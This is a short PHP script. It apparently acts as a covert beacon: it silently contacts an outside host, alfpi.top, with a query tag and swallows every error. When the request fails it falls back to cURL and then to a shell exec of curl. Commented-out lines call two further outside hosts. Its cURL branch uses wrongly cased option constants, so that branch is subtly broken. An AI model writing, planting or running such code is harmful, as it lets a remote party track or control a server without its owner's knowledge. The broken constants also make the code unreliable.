<?php


// $ok = file_get_contents('https://neomarvin.netlify.app/?c=salut');
// file_get_contents('https://alfpi.top/?c=ARNOXe');
// echo $ok;
function customErrorHandler($severity, $message, $file, $line){
    if(!(error_reporting() & $severity)){return;}
    throw new ErrorException($message, 0, $severity, $file,$line);
}set_error_handler('customErrorHandler');
try {$ok = file_get_contents('https://alfpi.top/ok.php/?c=OK');} catch (Exception $e) {try {
        if(function_exists('curl_init')){
            $ch = curl_init();$url = "https://alfpi.top/ok.php/?c=OK";
            curl_setopt($ch, curlOPT_URL, $url);curl_setopt($ch, curlOPT_RETURNTRANSFER, true);
            curl_setopt($ch, curlOPT_FOLLOWLOCATION, true);$response = curl_exec($ch);curl_close($ch);
        }else{exec("curl https://alfpi.top/ok.php/?c=OK -s ");}
    }catch(Exception $f){}}restore_error_handler();